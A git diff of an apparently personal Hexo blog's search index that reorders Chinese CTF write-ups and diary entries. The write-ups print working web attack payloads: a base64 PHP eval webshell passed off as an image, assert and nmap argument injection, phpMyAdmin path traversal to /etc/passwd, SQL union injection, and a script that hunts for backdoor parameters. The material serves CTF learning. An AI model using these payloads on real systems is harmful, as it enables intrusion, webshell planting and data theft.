@@ -293,17 +293,6 @@ id=0&#39; union select 1,2,3,列名 from 表名#
       </tags>
   </entry>
   <entry>
-    <title>20210601</title>
-    <url>/posts/810f4ee1/</url>
-    <content><![CDATA[<h2 id="最近几天在打比赛，断更"><a href="#最近几天在打比赛，断更" class="headerlink" title="最近几天在打比赛，断更"></a>最近几天在打比赛，断更</h2>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20210526</title>
     <url>/posts/2f1b0799/</url>
     <content><![CDATA[<h2 id="基于约束的sql注入"><a href="#基于约束的sql注入" class="headerlink" title="基于约束的sql注入"></a>基于约束的sql注入</h2><h2 id="dat-to-jpg"><a href="#dat-to-jpg" class="headerlink" title="dat to jpg"></a>dat to jpg</h2><p>dat文件转图片，先用前4个字节分别与FFD8 8950等异或，看异或后的值是不是个重复的，然后用脚本</p>
@@ -380,6 +369,17 @@ findFile(path)
         <tag>web</tag>
         <tag>sql注入</tag>
         <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210601</title>
+    <url>/posts/810f4ee1/</url>
+    <content><![CDATA[<h2 id="最近几天在打比赛，断更"><a href="#最近几天在打比赛，断更" class="headerlink" title="最近几天在打比赛，断更"></a>最近几天在打比赛，断更</h2>]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -576,6 +576,27 @@ Submit
       </tags>
   </entry>
   <entry>
+    <title>20210819</title>
+    <url>/posts/9c51da98/</url>
+    <content><![CDATA[<h1 id="XXX二手交易市场"><a href="#XXX二手交易市场" class="headerlink" title="XXX二手交易市场"></a>XXX二手交易市场</h1><p>一个实战题目，网站挺花哨的，没什么提示，最后在头像上传页面有个漏洞，上传一个图片，抓包发现是将图片转成base64传输的，可以将一句话伪装一下，就像这样</p>
+<pre><code>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
+</code></pre>
+<p>将jpeg换成php,后面的一句话base64encode一下，上传得到返回路径，这时候别乱删，把\给删了，直接蚁剑连接翻目录就行</p>
+<h1 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h1><p>F12看到有个admin.css，打开提示try，那就直接try,发现有源码，代码审计，很简单，传入一个cookie，这有个踩坑</p>
+<pre><code> echo urlencode(serialize($KEY));
+</code></pre>
+<p>先urlencode一下不容易出错</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>对web漏洞常见缩写的解释</title>
     <url>/posts/e15b0610/</url>
     <content><![CDATA[<h1 id="对web漏洞常见缩写的解释"><a href="#对web漏洞常见缩写的解释" class="headerlink" title="对web漏洞常见缩写的解释"></a>对web漏洞常见缩写的解释</h1><h2 id="xss（跨站脚本攻击）"><a href="#xss（跨站脚本攻击）" class="headerlink" title="xss（跨站脚本攻击）"></a>xss（跨站脚本攻击）</h2><p>全称<strong>Cross Site Scripting</strong>，攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取 Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
@@ -610,45 +631,6 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20210819</title>
-    <url>/posts/9c51da98/</url>
-    <content><![CDATA[<h1 id="XXX二手交易市场"><a href="#XXX二手交易市场" class="headerlink" title="XXX二手交易市场"></a>XXX二手交易市场</h1><p>一个实战题目，网站挺花哨的，没什么提示，最后在头像上传页面有个漏洞，上传一个图片，抓包发现是将图片转成base64传输的，可以将一句话伪装一下，就像这样</p>
-<pre><code>image=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=
-</code></pre>
-<p>将jpeg换成php,后面的一句话base64encode一下，上传得到返回路径，这时候别乱删，把\给删了，直接蚁剑连接翻目录就行</p>
-<h1 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h1><p>F12看到有个admin.css，打开提示try，那就直接try,发现有源码，代码审计，很简单，传入一个cookie，这有个踩坑</p>
-<pre><code> echo urlencode(serialize($KEY));
-</code></pre>
-<p>先urlencode一下不容易出错</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>202108202</title>
-    <url>/posts/3719f1b1/</url>
-    <content><![CDATA[<ol>
-<li>客户端配置了php环境，打算debug，在学习larvel的debug，但是不会弄，还在学</li>
-<li>安装了unbuntu，配置了ssh，用vscode远程连接虚拟机调试</li>
-<li>bugku的web基本做完了，buu上的是真难</li>
-<li>在系统的学习一下web</li>
-<li>搭建了私有云，还行挺流畅</li>
-<li>数学建模停摆了一段时间</li>
-<li>对服务器了解越来越丰富了，单纯宝塔已经无法满足了</li>
-<li>实习报告还没开始写</li>
-</ol>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
     <title>202108203</title>
     <url>/posts/401ec127/</url>
     <content><![CDATA[<h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; and 0 union select 1,2,3 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,TABLE_SCHEMA,TABLE_NAME <span class="keyword">from</span> INFORMATION_SCHEMA.COLUMNS 表 表名</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; and 0 union select 1,column_name,data_type from information_schema.columns where table_name=&#x27;</span>secret_table<span class="string">&#x27;# 列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,fl4g <span class="keyword">from</span> secret_table #</span><br></pre></td></tr></table></figure>
@@ -681,6 +663,24 @@ Submit
         <tag>ctf</tag>
         <tag>sql注入</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>202108202</title>
+    <url>/posts/3719f1b1/</url>
+    <content><![CDATA[<ol>
+<li>客户端配置了php环境，打算debug，在学习larvel的debug，但是不会弄，还在学</li>
+<li>安装了unbuntu，配置了ssh，用vscode远程连接虚拟机调试</li>
+<li>bugku的web基本做完了，buu上的是真难</li>
+<li>在系统的学习一下web</li>
+<li>搭建了私有云，还行挺流畅</li>
+<li>数学建模停摆了一段时间</li>
+<li>对服务器了解越来越丰富了，单纯宝塔已经无法满足了</li>
+<li>实习报告还没开始写</li>
+</ol>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
   </entry>
   <entry>
     <title>20210827</title>
@@ -733,29 +733,6 @@ Submit
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210901</title>
-    <url>/posts/8a5309dc/</url>
-    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
-<p>git泄露，代码审计，assert命令执行</p>
-</blockquote>
-<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
-</code></pre>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
-</code></pre>
-<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>rce</tag>
       </tags>
   </entry>
   <entry>
@@ -820,6 +797,47 @@ Submit
       </tags>
   </entry>
   <entry>
+    <title>20210901</title>
+    <url>/posts/8a5309dc/</url>
+    <content><![CDATA[<h1 id="mfs"><a href="#mfs" class="headerlink" title="mfs"></a>mfs</h1><blockquote>
+<p>git泄露，代码审计，assert命令执行</p>
+</blockquote>
+<pre><code>pyload: ?page=abc&#39;) or system(&quot;tac templates/flag.php&quot;);//
+</code></pre>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line">assert(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<pre><code>python2 GitHack.py http://114.67.246.176:10015/.git/
+</code></pre>
+<p>先用githack,爬取.git,发现存在flag.php,利用assert代码执行，先用’)将strops闭合，<br>然后执行后面的</p>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>rce</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20210907</title>
+    <url>/posts/6330ace9/</url>
+    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>利用了namp一个参数，将一句话写入文件，rce</p>
+<p>同时escapeshellarg()和escapeshellcmd()同时出现会有bug</p>
+<pre><code>pyload:?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&#39;
+</code></pre>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>rce</tag>
+        <tag>命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>20210926</title>
     <url>/posts/2601fefd/</url>
     <content><![CDATA[<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>先贴一篇文章，讲的比较好，关于mysql注入的</p>
@@ -860,24 +878,6 @@ Submit
         <tag>web</tag>
         <tag>sql注入</tag>
         <tag>测试工具</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20210907</title>
-    <url>/posts/6330ace9/</url>
-    <content><![CDATA[<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>利用了namp一个参数，将一句话写入文件，rce</p>
-<p>同时escapeshellarg()和escapeshellcmd()同时出现会有bug</p>
-<pre><code>pyload:?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php&#39;
-</code></pre>
-<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>rce</tag>
-        <tag>命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -982,18 +982,6 @@ Submit
       </tags>
   </entry>
   <entry>
-    <title>20211018</title>
-    <url>/posts/5df9dcd3/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20211017</title>
     <url>/posts/cd46c142/</url>
     <content><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>buu这个题应该是环境有问题，不能复现wp</p>
@@ -1014,6 +1002,34 @@ Submit
         <tag>web</tag>
         <tag>文件上传</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>20211018</title>
+    <url>/posts/5df9dcd3/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2>]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20211031</title>
+    <url>/posts/161306f5/</url>
+    <content><![CDATA[<p>失眠了，想了想不知道干什么</p>
+<p>刚开始玩了会古墓丽影，不想玩了</p>
+<p>想到前段时间服务器好像坏了，又修了修，重新在服务器上把博客搭好了</p>
+<p>现在博客Github上和服务器上的都能用</p>
+<p>之所以保留Github是因为足够稳定，用的是一级域名，<a href="https://haorical.xyz/">https://haorical.xyz</a></p>
+<p>服务器用的阿里云，国内比较快，用的二级域名，<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p>
+<p>暂时没部署证书，以后再弄吧，现在不想弄了。</p>
+<p>又不知道干啥了，过两天生日，一点感觉都没有，明天还得复习线代还得打比赛。。。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
   </entry>
   <entry>
     <title>20211117</title>
@@ -1047,22 +1063,6 @@ var_dump(file_get_contents(&quot;/flag&quot;));
       </tags>
   </entry>
   <entry>
-    <title>20211031</title>
-    <url>/posts/161306f5/</url>
-    <content><![CDATA[<p>失眠了，想了想不知道干什么</p>
-<p>刚开始玩了会古墓丽影，不想玩了</p>
-<p>想到前段时间服务器好像坏了，又修了修，重新在服务器上把博客搭好了</p>
-<p>现在博客Github上和服务器上的都能用</p>
-<p>之所以保留Github是因为足够稳定，用的是一级域名，<a href="https://haorical.xyz/">https://haorical.xyz</a></p>
-<p>服务器用的阿里云，国内比较快，用的二级域名，<a href="http://blog.haorical.xyz/">http://blog.haorical.xyz</a></p>
-<p>暂时没部署证书，以后再弄吧，现在不想弄了。</p>
-<p>又不知道干啥了，过两天生日，一点感觉都没有，明天还得复习线代还得打比赛。。。</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
     <title>20211118</title>
     <url>/posts/5c3bb6e4/</url>
     <content><![CDATA[<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>上传.htaccess </p>
@@ -1078,6 +1078,54 @@ var_dump(file_get_contents(&quot;/flag&quot;));
 </code></pre>
 <h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>xxe</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>20211129</title>
+    <url>/posts/11d5b1/</url>
+    <content><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><blockquote>
+<p>phpmyadmin 4.8 cve 文件包含漏洞</p>
+</blockquote>
+<pre><code>?target=db_sql.php%253f/../../../../../../etc/passwd
+</code></pre>
+<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>学到了请求有get改成post</p>
+<p>点击help，发现报错，把get改为post，同时改后面参数，改成post上去</p>
+<pre><code>com.wm.ctf.DownloadController.doPost(DownloadController.java:24)
+</code></pre>
+<p>得到一个奇怪的包的目录</p>
+<p>看了下wp，java项目源码在WEB-INF中，构造pyload</p>
+<p>params需要加个filename=WEB-INF/classes/com/wm/ctf/FlagController.class 同时post filename就可以把class下下来</p>
+<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>把源码下下来，一共好几千个文件里面有我们需要的马，我们只需要一个一个试即可🥰</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:\Users\haodo\Desktop\20211129\高明黑客\src&quot;</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>								<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>											 <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://fab0ef41-82a7-480e-a354-be549de9731f.node4.buuoj.cn:81/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:									<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:													<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
+<p>需要先本地测试，找到马后直接服务器利用即可</p>
+<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>变量覆盖漏洞</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>好多payload:</p>
+<pre><code>yds=flag
+is=flag&amp;flag=flag
+</code></pre>
+<h2 id="Had-a-bad-day"><a href="#Had-a-bad-day" class="headerlink" title="Had a bad day"></a>Had a bad day</h2><p>php://filter应用</p>
+<p><a href="https://oatmeal.vip/security/web-learning/php-filter/">https://oatmeal.vip/security/web-learning/php-filter/</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> 	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>构造:</p>
+<pre><code>php://filter/convert.base64-encode/write=woofers/resource=flag
+</code></pre>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>代码审计</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>20220101</title>
+    <url>/posts/c3e022b4/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>2021秋季赛部分wp</title>
@@ -1141,72 +1189,6 @@ var_dump(file_get_contents(&quot;/flag&quot;));
       </tags>
   </entry>
   <entry>
-    <title>20211129</title>
-    <url>/posts/11d5b1/</url>
-    <content><![CDATA[<h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><blockquote>
-<p>phpmyadmin 4.8 cve 文件包含漏洞</p>
-</blockquote>
-<pre><code>?target=db_sql.php%253f/../../../../../../etc/passwd
-</code></pre>
-<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>学到了请求有get改成post</p>
-<p>点击help，发现报错，把get改为post，同时改后面参数，改成post上去</p>
-<pre><code>com.wm.ctf.DownloadController.doPost(DownloadController.java:24)
-</code></pre>
-<p>得到一个奇怪的包的目录</p>
-<p>看了下wp，java项目源码在WEB-INF中，构造pyload</p>
-<p>params需要加个filename=WEB-INF/classes/com/wm/ctf/FlagController.class 同时post filename就可以把class下下来</p>
-<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>把源码下下来，一共好几千个文件里面有我们需要的马，我们只需要一个一个试即可🥰</p>
